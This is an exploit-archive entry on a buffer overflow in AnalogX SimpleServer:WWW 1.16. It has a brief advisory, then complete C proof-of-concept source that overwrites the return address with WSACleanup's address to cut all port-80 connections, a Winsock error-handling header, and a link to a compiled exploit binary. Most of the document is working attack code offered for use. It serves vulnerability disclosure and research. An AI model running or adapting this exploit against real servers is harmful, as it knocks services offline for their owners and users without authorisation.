source: http://www.securityfocus.com/bid/5006/info

Reportedly, version 1.16 of SimpleServer:WWW is prone to a buffer overflow vulnerability.

A remote attacker is able to connect to SimpleServer via telnet and makes an invalid request to the server. This will cause the web server to crash and potentially lead to a buffer overflow condition.

This issue was originally reported as a denial of service, however, it has been reported possible to initiate a buffer overflow condition. 

----------------------------------analog-x-http-test.c-------------------------------------

/*
AnalogX SimpleServer 1.16 Proof-of-concept
	by Auriemma Luigi (e-mail: bugtest at sitoverde.com)

The minimum number of chars to send to the server is 348 'A's
plus "\r\n\r\n" ( = 352).

This is only a proof-of-concept, and the only thing that it do
is to close all the connections of the program http.exe

For do this I have decided to point the EIP to the WSACleanup
function, so all the connections on the port 80 will be killed
and nobody can connect to it.
If I send only 'A's the only connection that will be killed is
the same where the attack was launched, and until the program
is not closed it will continue to do its work, but if we call
WSACleanup is more useful!

* This source is covered by the GNU GPL
*/

#include <stdio.h>
#include <winsock.h>
#include <string.h>
#include "sock_err.h"

#define BUFFSIZE	360
#define OFFSET	352	//where the EIP is overwritten
#define PORT	80
#define CHZ	'A'
#define EIP	"\xf8\xa7\x41\x00"	//the EIP of WSACleanup()
#define RETURN	"\r\n\r\n"

int main(int argc, char *argv[]) {
	setbuf(stdout, NULL);
	if(argc < 2) {
		printf("\nUsage: %s <host>\n", argv[0]);
		exit(1);
	}

	unsigned char	buff[BUFFSIZE];
	struct	sockaddr_in 	peer;
	struct	hostent *hp;
	int	shandle,
		err;
	WSADATA wsadata;

	WSAStartup(MAKEWORD(2,0), &wsadata);
	if(inet_addr(argv[1]) == INADDR_NONE) {
                hp = gethostbyname(argv[1]);
		if(hp == 0) sock_err(-1);
                else peer.sin_addr = *(struct in_addr *)hp->h_addr;
        }
                else peer.sin_addr.s_addr = inet_addr(argv[1]);
	peer.sin_port   = htons(PORT);
	peer.sin_family = AF_INET;

	memset(buff, CHZ, OFFSET);
	memcpy(buff + OFFSET, EIP, 4);
	memcpy(buff + OFFSET + 4, RETURN, 4);

	shandle = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sock_err(shandle);
	err = connect(shandle, (struct sockaddr *)&peer, sizeof(peer));
	sock_err(err);
	err = send(shandle, buff, BUFFSIZE, 0);
	sock_err(err);
	err = recv(shandle, buff, BUFFSIZE, 0);
	if(err < 0) printf("\nServer crashed!\n");
		else printf("\nServer is not vulnerable\n");
	closesocket(shandle);
	WSACleanup();
	return(0);
}

----------------------------------analog-x-sock_err.h-------------------------------------

void sock_err(int err) {
	char	*error;

	if(err < 0) {
		switch(WSAGetLastError()) {
		case 10004: error = "Interrupted system call"; break;
		case 10009: error = "Bad file number"; break;
		case 10013: error = "Permission denied"; break;
		case 10014: error = "Bad address"; break;
		case 10022: error = "Invalid argument (not bind)"; break;
		case 10024: error = "Too many open files"; break;
		case 10035: error = "Operation would block"; break;
		case 10036: error = "Operation now in progress"; break;
		case 10037: error = "Operation already in progress"; break;
		case 10038: error = "Socket operation on non-socket"; break;
		case 10039: error = "Destination address required"; break;
		case 10040: error = "Message too long"; break;
		case 10041: error = "Protocol wrong type for socket"; break;
		case 10042: error = "Bad protocol option"; break;
		case 10043: error = "Protocol not supported"; break;
		case 10044: error = "Socket type not supported"; break;
		case 10045: error = "Operation not supported on socket"; break;
		case 10046: error = "Protocol family not supported"; break;
		case 10047: error = "Address family not supported by protocol family"; break;
		case 10048: error = "Address already in use"; break;
		case 10049: error = "Can't assign requested address"; break;
		case 10050: error = "Network is down"; break;
		case 10051: error = "Network is unreachable"; break;
		case 10052: error = "Net dropped connection or reset"; break;
		case 10053: error = "Software caused connection abort"; break;
		case 10054: error = "Connection reset by peer"; break;
		case 10055: error = "No buffer space available"; break;
		case 10056: error = "Socket is already connected"; break;
		case 10057: error = "Socket is not connected"; break;
		case 10058: error = "Can't send after socket shutdown"; break;
		case 10059: error = "Too many references, can't splice"; break;
		case 10060: error = "Connection timed out"; break;
		case 10061: error = "Connection refused"; break;
		case 10062: error = "Too many levels of symbolic links"; break;
		case 10063: error = "File name too long"; break;
		case 10064: error = "Host is down"; break;
		case 10065: error = "No Route to Host"; break;
		case 10066: error = "Directory not empty"; break;
		case 10067: error = "Too many processes"; break;
		case 10068: error = "Too many users"; break;
		case 10069: error = "Disc Quota Exceeded"; break;
		case 10070: error = "Stale NFS file handle"; break;
		case 10091: error = "Network SubSystem is unavailable"; break;
		case 10092: error = "WINSOCK DLL Version out of range"; break;
		case 10093: error = "Successful WSASTARTUP not yet performed"; break;
		case 10071: error = "Too many levels of remote in path"; break;
		case 11001: error = "Host not found"; break;
		case 11002: error = "Non-Authoritative Host not found"; break;
		case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
		case 11004: error = "Valid name, no data record of requested type"; break;
		default: error = "Unknown error"; break;
		}
		printf("\nError: %s\n", error);
		exit(1);
	}
}


https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/21542.exe